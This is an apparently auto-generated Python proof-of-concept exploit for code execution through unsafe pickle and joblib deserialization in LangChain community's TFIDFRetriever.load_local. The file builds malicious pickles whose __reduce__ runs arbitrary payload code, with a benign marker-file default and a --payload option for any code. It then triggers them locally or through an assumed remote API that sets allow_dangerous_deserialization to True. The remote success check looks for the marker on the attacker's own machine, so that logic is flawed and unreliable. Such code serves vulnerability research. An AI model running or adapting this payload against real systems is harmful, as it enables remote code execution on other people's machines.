#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-017
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_7.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The load_local function in TFIDFRetriever uses joblib.load and pickle.load
on files constructed from user-controlled folder_path and file_name. Although there is an
allow_dangerous_deserialization flag that defaults to False, the caller can set it to True
to bypass the protection. This allows an attacker to load arbitrary pickle/joblib files
that execute arbitrary code.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Hosting it via a simple HTTP server or placing it in a known location
3. Calling load_local with attacker-controlled folder_path and file_name pointing to the malicious file

Usage:
    python poc_exploit.py --target http://victim:8000 --folder_path /tmp/attacker_controlled --file_name malicious

Note: This PoC assumes the target application exposes the load_local function via an API endpoint.
Adjust the target URL and parameters as needed for your specific scenario.
"""

import argparse
import os
import pickle
import sys
import tempfile
import time
import requests
from pathlib import Path

# Benign payload that creates a marker file to prove code execution
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
"""

def create_malicious_pickle(payload_code: str) -> bytes:
    """
    Create a malicious pickle that executes arbitrary code when unpickled.
    
    Args:
        payload_code: Python code to execute as a string
        
    Returns:
        Serialized pickle bytes containing the malicious payload
    """
    class MaliciousPickle:
        def __reduce__(self):
            return (exec, (payload_code,))
    
    return pickle.dumps(MaliciousPickle())

def create_malicious_joblib(payload_code: str) -> bytes:
    """
    Create a malicious joblib file (which is just pickle under the hood).
    
    Args:
        payload_code: Python code to execute as a string
        
    Returns:
        Serialized joblib bytes containing the malicious payload
    """
    # joblib.load uses pickle internally, so we can use the same approach
    return create_malicious_pickle(payload_code)

def setup_attack_files(folder_path: str, file_name: str, payload_code: str):
    """
    Create malicious .pkl and .joblib files in the specified folder.
    
    Args:
        folder_path: Directory to create files in
        file_name: Base name for the files (without extension)
        payload_code: Python code to execute
    """
    path = Path(folder_path)
    path.mkdir(parents=True, exist_ok=True)
    
    # Create malicious .pkl file
    pkl_path = path / f"{file_name}.pkl"
    with open(pkl_path, "wb") as f:
        f.write(create_malicious_pickle(payload_code))
    print(f"[+] Created malicious pickle file: {pkl_path}")
    
    # Create malicious .joblib file
    joblib_path = path / f"{file_name}.joblib"
    with open(joblib_path, "wb") as f:
        f.write(create_malicious_joblib(payload_code))
    print(f"[+] Created malicious joblib file: {joblib_path}")

def trigger_exploit(target_url: str, folder_path: str, file_name: str):
    """
    Trigger the vulnerable load_local function with attacker-controlled parameters.
    
    This function simulates calling the vulnerable API endpoint. In a real scenario,
    the target application would have an endpoint that calls load_local with user input.
    
    Args:
        target_url: Base URL of the vulnerable application
        folder_path: Path to the folder containing malicious files
        file_name: Base name of the malicious files (without extension)
    """
    # Construct the API endpoint URL (adjust based on actual application)
    # This assumes the application has an endpoint like /api/v1/trigger that calls load_local
    endpoint = f"{target_url.rstrip('/')}/api/v1/trigger"
    
    # Prepare the payload parameters
    params = {
        "folder_path": folder_path,
        "file_name": file_name,
        "allow_dangerous_deserialization": True  # Bypass the guard
    }
    
    print(f"[*] Sending exploit request to {endpoint}")
    print(f"[*] Parameters: {params}")
    
    try:
        # Send the request to trigger the vulnerability
        response = requests.post(endpoint, json=params, timeout=10)
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Check if the exploit was successful
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] EXPLOIT SUCCESSFUL! Marker file /tmp/poc_success.txt was created.")
            print("[+] This proves arbitrary code execution was achieved.")
        else:
            print("[!] Marker file not found. The exploit may have failed or the payload may not have executed.")
            print("[!] Check the target application logs for details.")
            
    except requests.exceptions.ConnectionError:
        print("[-] Connection error: Could not reach the target URL.")
        print("[-] Make sure the target application is running and accessible.")
    except requests.exceptions.Timeout:
        print("[-] Request timed out. The target may be slow or unreachable.")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for RCE in langchain-community-only load_local function"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL of the vulnerable application (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--folder_path",
        default="/tmp/attacker_controlled",
        help="Folder path to store malicious files (default: /tmp/attacker_controlled)"
    )
    parser.add_argument(
        "--file_name",
        default="malicious",
        help="Base name for malicious files (default: malicious)"
    )
    parser.add_argument(
        "--payload",
        default=BENIGN_PAYLOAD,
        help="Python code to execute as payload (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--local",
        action="store_true",
        help="Run locally for testing (creates files and simulates the exploit)"
    )
    
    args = parser.parse_args()
    
    # Create the malicious files
    print("[*] Setting up attack files...")
    setup_attack_files(args.folder_path, args.file_name, args.payload)
    
    if args.local:
        # Local testing mode: directly call the vulnerable function
        print("\n[*] Running in local testing mode...")
        try:
            # Import the vulnerable module (adjust path as needed)
            sys.path.insert(0, "/tmp/langchain-community-only")
            from langchain_community.retrievers.tfidf import TFIDFRetriever
            
            # Trigger the vulnerability
            print("[*] Calling load_local with allow_dangerous_deserialization=True...")
            retriever = TFIDFRetriever.load_local(
                folder_path=args.folder_path,
                file_name=args.file_name,
                allow_dangerous_deserialization=True  # Bypass the guard
            )
            print(f"[+] load_local returned: {retriever}")
            
            # Check for successful exploitation
            if os.path.exists("/tmp/poc_success.txt"):
                print("[+] EXPLOIT SUCCESSFUL! Marker file /tmp/poc_success.txt was created.")
            else:
                print("[!] Marker file not found. Check if the payload executed correctly.")
                
        except Exception as e:
            print(f"[-] Error during local testing: {e}")
    else:
        # Remote exploitation mode
        print("\n[*] Running in remote exploitation mode...")
        trigger_exploit(args.target, args.folder_path, args.file_name)

if __name__ == "__main__":
    print("=" * 60)
    print("PoC Exploit for RCE in langchain-community-only load_local")
    print("=" * 60)
    print()
    
    # Clean up any previous marker file
    if os.path.exists("/tmp/poc_success.txt"):
        os.remove("/tmp/poc_success.txt")
    
    main()
    
    print("\n[*] Exploit completed.")
    print("[*] Remember to clean up: rm -rf /tmp/attacker_controlled /tmp/poc_success.txt")
